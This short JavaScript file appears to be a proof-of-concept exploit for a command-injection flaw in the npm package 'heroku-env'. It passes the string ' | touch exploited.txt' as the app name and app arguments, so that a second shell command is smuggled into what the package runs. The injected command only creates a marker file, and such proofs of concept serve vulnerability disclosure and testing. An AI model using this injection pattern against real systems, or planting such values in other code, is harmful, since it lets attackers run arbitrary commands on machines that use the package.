const pkg = require('heroku-env');

const payload = " | touch exploited.txt";

console.log(pkg);

const app = payload;

const app_name = payload;

const cb = function(error, data) {

};

pkg(app, app_name, cb);